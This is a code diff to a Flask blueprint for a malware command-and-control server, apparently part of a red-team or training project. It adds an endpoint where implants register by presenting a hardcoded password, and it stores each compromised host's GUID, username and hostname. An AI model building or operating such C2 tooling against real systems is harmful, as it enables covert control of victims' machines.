@@ -1,10 +1,11 @@
 from crypt import methods
 from flask import Blueprint, jsonify, request
 from speedrun.db import db
-
+from speedrun.parser import RegisterData
+from speedrun.models import make_implant
 import struct
 
-password = struct.pack(">16s", b"1337ch0nkyboy").hex()
+password = struct.pack("<16s", b"1337ch0nkyboy").hex()
 
 c2 = Blueprint('c2', __name__)
 
@@ -32,5 +33,21 @@ def hello_c2():
 
 # add register, task 
 
+@c2.route("/implant/register", methods=["POST"])
+def handle_register():
+    data = request.data
+    rd = RegisterData()
+    try:
+        rd.unpack(data)
+        if rd.Password !=password:
+            return  ":("
+        implant = make_implant(rd.Guid, rd.szUsername, rd.szHostname)
+        db.session.add(implant)
+        db.session.commit()
+        print("Successfully registered a new implant: ", implant.implant_id )
+        return "ok"
+    except Exception as e:
+        print("Failed to register implant", Exception, e)
+        return ":("
 
    
